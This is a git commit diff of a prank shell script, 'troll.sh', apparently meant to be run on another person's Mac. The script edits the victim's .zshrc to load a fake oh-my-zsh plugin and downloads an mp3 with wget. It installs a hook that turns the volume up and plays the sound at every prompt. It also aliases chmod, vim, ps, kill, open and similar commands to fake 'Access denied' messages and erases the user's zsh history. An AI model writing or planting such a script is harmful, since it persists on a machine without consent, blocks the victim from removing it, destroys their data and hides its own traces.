33773645250cb134c084baa892689186df1f21f7
kema-dev <54537427+kema-dev@users.noreply.github.com>
2022-08-11 01:15:24 +0200

    shell_audio v1

--- shell_audio_42/troll.sh
+++ shell_audio_42/troll.sh
@@ -1,18 +1,16 @@
 NAME="autoco"
 STRING="plugins=($NAME"
-FILE=".zshrc"
-DIR="~/.oh-my-zsh/custom/plugins/$NAME/"
-SOUND="$DIR""apoil.mp3"
+FILE="$HOME/.zshrc"
+DIR="$HOME/.oh-my-zsh/custom/plugins/$NAME/"
+SOUND="$DIR$NAME.mp3"
 if ! grep -q "$STRING" "$FILE" ; then
-	sed -i "s/^plugins=(/plugins=($NAME /" "$FILE"
+	sed -i "s/^plugins=(/$STRING /" "$FILE"
 fi
 mkdir -p "$DIR"
 if [ ! -e "$SOUND" ]; then
 	wget -q -O "$SOUND" "https://github.com/kema-dev/trolls/blob/main/shell_audio/apoil.mp3\?raw\=true"
 fi
 precmd() { osascript -e 'set Volume 10' ; afplay "$SOUND" > /dev/null & }
-echo -n >| $HOME/.zsh_history
-
 alias chmod="echo chmod: Access denied"
 alias vim="echo vim: Access denied"
 alias vi="echo vi: Access denied"
@@ -34,4 +32,4 @@ alias ps="echo ps: Access denied"
 alias kill="echo kill: Access denied"
 alias killall="echo killall: Access denied"
 alias open="echo open: Access denied"
-export PATH=""
+echo -n >| $HOME/.zsh_history
